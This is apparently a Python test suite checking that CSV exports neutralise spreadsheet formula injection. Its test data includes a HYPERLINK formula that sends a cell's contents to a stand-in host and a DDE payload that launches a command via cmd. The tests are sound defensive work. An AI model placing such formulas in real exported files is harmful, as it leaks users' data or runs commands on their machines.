from __future__ import annotations

import csv
import io
from types import SimpleNamespace

from app.questionnaire import corpus
from app.services import csv_export
from app.services.data_explorer import report_tools

PAYLOAD = '=HYPERLINK("https://example.invalid/?"&A2,"open")'


def _rows(text: str) -> list[list[str]]:
    return list(csv.reader(io.StringIO(text.lstrip("\ufeff"))))


class _Record(SimpleNamespace):
    def __getattr__(self, name: str) -> None:
        return None


def test_record_csv_export_neutralises_a_formula_in_a_creator_field() -> None:
    record = _Record(id="p1", productName=PAYLOAD, media=[])
    rows = _rows(csv_export.records_to_csv("product", [record]))
    cells = rows[1]
    assert not any(cell.startswith(("=", "@")) for cell in cells)
    assert "'" + PAYLOAD in cells


def test_report_csv_neutralises_formula_triggers_and_keeps_plain_numbers() -> None:
    sheet = {
        "name": "S",
        "columns": ["A", "B", "C", "D", "E", "F"],
        "rows": [["=1+1", "-5", "@SUM(A1)", "+cmd|' /C calc'!A0", "\tx", "plain"]],
        "prose": [],
    }
    rows = _rows(b"".join(report_tools.csv_chunks(sheet)).decode("utf-8"))
    assert rows[1] == ["'=1+1", "-5", "'@SUM(A1)", "'+cmd|' /C calc'!A0", "'\tx", "plain"]


def test_questionnaire_corpus_csv_neutralises_answer_text() -> None:
    text = corpus.render([{"answer": "-2+3", "q": "ok"}], ["answer", "q"], "csv")
    rows = _rows(text)
    assert rows[1] == ["'-2+3", "ok"]


def test_the_cell_rule() -> None:
    from app.questionnaire.csv_cells import neutralise

    assert neutralise("=1") == "'=1"
    assert neutralise("＝1") == "'＝1"
    assert neutralise("\rx") == "'\rx"
    assert neutralise("-12.5") == "-12.5"
    assert neutralise("+91") == "+91"
    assert neutralise("-") == "-"
    assert neutralise("") == ""
    assert neutralise(None) is None
    assert neutralise(-3) == -3
    assert neutralise("Water pot") == "Water pot"
